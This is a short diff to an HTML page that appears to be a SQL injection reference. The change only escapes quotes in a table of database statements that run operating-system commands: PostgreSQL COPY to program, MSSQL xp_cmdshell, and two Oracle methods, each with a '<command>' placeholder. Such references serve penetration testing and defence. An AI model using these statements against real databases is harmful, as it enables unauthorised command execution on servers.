@@ -1039,18 +1039,18 @@ These statements execute local OS commands. The PostgreSQL, MSSQL, and 2nd Oracl
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>COPY (SELECT '') to program '&lt;command&gt;'</td>
+<td>COPY (SELECT &#x27;&#x27;) to program &#x27;&lt;command&gt;&#x27;</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>EXEC xp_cmdshell '&lt;command&gt;'</td>
+<td>EXEC xp_cmdshell &#x27;&lt;command&gt;&#x27;</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">Oracle</td>
-<td>select os_command.exec_clob('&lt;command&gt;') cmd from dual</td>
+<td>select os_command.exec_clob(&#x27;&lt;command&gt;&#x27;) cmd from dual</td>
 </tr>
 <tr>
-<td>DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '&lt;command&gt;', enabled => TRUE)</td>
+<td>DBMS_SCHEDULER.CREATE_JOB (job_name => &#x27;exec&#x27;, job_type => &#x27;EXECUTABLE&#x27;, job_action => &#x27;&lt;command&gt;&#x27;, enabled => TRUE)</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
